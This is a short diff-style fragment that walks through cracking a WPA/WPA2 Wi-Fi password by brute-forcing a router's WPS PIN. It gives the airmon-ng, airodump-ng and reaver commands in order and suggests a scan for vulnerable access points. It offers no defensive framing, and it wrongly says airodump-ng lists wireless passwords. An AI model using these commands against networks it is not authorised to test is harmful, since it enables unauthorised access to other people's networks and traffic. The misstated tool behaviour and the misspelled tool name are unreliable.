@@ -1,0 +1,13 @@
+$ airmon-ng start wlan0
+
+$ airodump-ng mon0
+It will lists the available wireless passwords, now copy the BSSID of the Access Point ( e.g : 00:11:28:32:49:55 )
+Starting the attack type:
+
+$ reaver -i mon0 -b 00:11:28:32:49:55
+
+Now it will start testing bruteforcing the PIN number of the vulnerability WPS (which we have spoke about it), and it will show you the WPA/WPA2 Password in the end of the Crack.
+
+Note: You can use walsh -i mon0 to scan for vulnerable Access Points.
+
+
